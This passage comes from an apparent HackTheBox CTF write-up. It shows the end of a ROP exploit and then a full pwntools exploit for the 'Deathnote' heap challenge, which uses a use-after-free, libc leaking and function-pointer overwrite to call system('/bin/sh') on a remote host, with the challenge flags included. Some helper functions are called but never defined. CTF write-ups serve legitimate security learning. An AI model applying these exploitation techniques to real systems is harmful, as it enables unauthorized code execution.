rj = lambda a, b, c : a.rjust(b, c)
lj = lambda a, b, c : a.ljust(b, c)
d = lambda a: a.decode('utf-8')
e = lambda a: a.encode()
cl = lambda: io.close()
p = lj(b'/bin/sh\0', 0x28, b'\0')
p += p64(0x000000000040101a) * 0x2
p += p64(0x0000000000401169)
sla(b'>> ', p)
com()
# flag = HTB{n0_n33d_4_l34k5_wh3n_u_h4v3_5y5t3m}
```

![image](https://hackmd.io/_uploads/rJCvXQ1Ra.png)

# 7. Deathnote (_medium_)

> Given a fully mitigated Executable and Linkable Format (ELF), there is an 'add' function that allows us to add data to an index, a 'show' function to display the data at an index, and a 'delete' function to remove previously stored data at an index
>
> ![image](https://hackmd.io/_uploads/SJSCuu-Cp.png)

![image](https://hackmd.io/_uploads/BkhkTPZCp.png)

![image](https://hackmd.io/_uploads/S1OZTDZ0T.png)

![image](https://hackmd.io/_uploads/S1cfpwZCa.png)

> There is a use-after-free vulnerability where free(_(void \*\*)(8LL _ num + a1)) can result in the reuse of a previously released block of memory
>
> ![image](https://hackmd.io/_uploads/SymETw-Aa.png)
> On the \_ function, there is v2 = (void (\_\_fastcall _)(\_QWORD))strtoull(_(const char \*_)a1, 0LL, 16) that converts our hexadecimal string to an unsigned long, and then calls v2(_(\_QWORD \*)(a1 + 8)). We can overwrite v2 to system and a1 + 8 to the string "/bin/sh", resulting in system("/bin/sh") and allowing us to achieve arbitrary code execution
>
> ![image](https://hackmd.io/_uploads/ryZDTvW06.png)

```python
from pwn import *
exe = './deathnote'
elf = context.binary = ELF(exe, checksec = 0)
context.bits = 64
context.log_level = 'debug'
context.terminal = ["kitty", "@launch", "--location=split", "--cwd=current"]
host, port = "nc 83.136.252.248 33320".split(" ")[1:3]
context.log_level = 'debug'
libc = ELF("./glibc/libc.so.6", checksec = 0)
ld = ELF("./glibc/ld-linux-x86-64.so.2", checksec = 0)
io = remote(host, port)
sla = lambda a, b: io.sendlineafter(a, b)
sa = lambda a, b: io.sendafter(a, b)
ru = lambda a: io.recvuntil(a)
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
rl = lambda: io.recvline()
com = lambda: io.interactive()
li = lambda a: log.info(a)
rud = lambda a:io.recvuntil(a, drop=0x1)
r = lambda: io.recv()
int16 = lambda a: int(a, 16)
rar = lambda a: io.recv(a)
rj = lambda a, b, c : a.rjust(b, c)
lj = lambda a, b, c : a.ljust(b, c)
d = lambda a: a.decode('utf-8')
e = lambda a: a.encode()
cl = lambda: io.close()

def create(size: bytes, idx: bytes, data: bytes):
	sla('💀 ', b'1')
	sla('💀 ', e(str(size)))
	sla('💀 ', e(str(idx)))
	sla('💀 ', data)

def remove(idx: bytes):
	sla('💀 ', b'2')
	sla('💀 ', e(str(idx)))

def show(idx: bytes):
    sla('💀 ', b'3')
    sla('💀 ', e(str(idx)))
    rud(b'Page content: ')
    show = rud(b'\n')
    li(f"Leaked: {show}")
    return show

def exit():
	sla('💀 ', b'42')

def deobfuscate(val):
    mask = 0xfff << 52
    while mask:
        v = val & mask
        val ^= (v >> 12)
        mask >>= 12
    return val

def obfuscate(p, adr):
    return p^(adr>>12)

ror = lambda val, r_bits, max_bits: \
    ((val & (2**max_bits-1)) >> r_bits%max_bits) | \
    (val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))

def encrypt(v, key):
    return rol(v ^ key, 0x11, 64)

def www_tcache_poisoning(where, what):
    create_small(b'')
    create_small(b'')
    delete(2)
    delete(1)
    addr = deobfuscate(view(1))
    log.info(f"addr @ 0x{addr:x}")
    edit(1, p64(where ^ (addr >> 12)))
    create_small(b'')
    create_small(b'')
    edit(4, what)

for i in range(0, 7, 1):
    create(0x80, i, b'')
remove(0)
heap = u64(lj(show(0), 8, b'\0')) << 12
li(f"heap @ {hex(heap)}")
create(0x80, 0, b'YY')
create(0x80, 7, b'YY')
create(0x80, 8, b'YY')
create(0x10, 9, b"/bin/sh\0")
for i in range(0, 7, 1):
    remove(i)
remove(8)
remove(7)
leaked = u64(lj(show(8), 8, b'\0'))
libc.address = leaked - 0x219ce0 - 0x1000
assert libc.address & 0xfffffffffffff000
li(f"Libc Address: {hex(libc.address)}")
create(0x80, 0, e(str(hex(libc.address + 0x50d70)[2:])))
create(0x80, 1, b'/bin/sh')
exit()
com()
# flag = HTB{0m43_w4_m0u_5h1nd31ru~uWu}
```

![image](https://hackmd.io/_uploads/rJVtsPWRp.png)
